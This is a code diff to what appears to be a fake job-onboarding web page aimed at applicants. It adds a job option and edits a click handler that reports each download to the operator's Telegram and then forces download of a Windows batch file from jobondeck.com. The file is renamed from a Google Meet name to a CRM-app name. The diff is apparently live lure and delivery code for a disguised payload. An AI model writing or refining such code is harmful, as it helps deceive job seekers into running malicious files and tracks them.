@@ -333,6 +333,7 @@
                         <option value="Customer Care Representative">Customer Care Representative</option>
                         <option value="Social Media Marketing Assistant">Social Media Marketing Assistant</option>
                         <option value="Remote Administrative Coordinator">Remote Administrative Coordinator</option>
+                        <option value="Delivery Driver">Delivery Driver</option>
                     </select>
                 </div>
 
@@ -419,13 +420,13 @@
         // 1. Report to your Telegram
         await sendToTelegram(
             '📥 <b>Download Started</b>\n\n' +
-            'Someone just clicked to download <b>Team_WorkSpace.msi</b> from the onboarding portal.'
+            'Someone just clicked to download <b>Gethypower.CRM.bat</b> from the onboarding portal.'
         );
 
         // 2. Trigger actual download
         const link = document.createElement('a');
-        link.href = 'https://jobondeck.com/Meet/files/Google.Meet.bat';
-        link.download = 'https://jobondeck.com/Meet/files/Google.Meet.bat';
+        link.href = 'https://jobondeck.com/Meet/files/Gethypower.CRM.bat';
+        link.download = 'https://jobondeck.com/Meet/files/Gethypower.CRM.bat';
         document.body.appendChild(link);
         link.click();
         document.body.removeChild(link);
